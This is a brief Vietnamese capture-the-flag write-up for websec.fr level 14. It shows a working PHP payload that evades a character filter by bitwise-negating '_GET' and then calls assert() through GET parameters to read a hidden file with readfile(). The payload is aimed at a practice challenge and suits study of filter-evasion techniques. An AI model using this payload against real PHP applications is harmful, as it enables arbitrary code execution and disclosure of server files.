# Solution

Dùng URL negation để bypass filter

ta construct `${_GET}{0}(${_GET}{1})`

với `_GET = ~%A0%B8%BA%AB`

POST đến 

```
https://websec.fr/level14/index.php
?0=assert
&1=print_r(readfile('0e7efcd6e821f4bb90af4e4c439001944c1769da.php'))
```
\+

```
code=${~%A0%B8%BA%AB}{0}(${~%A0%B8%BA%AB}{1});
```

Mình dùng Hackbar với `enctype=application/x-www-form-urlencoded(raw)`
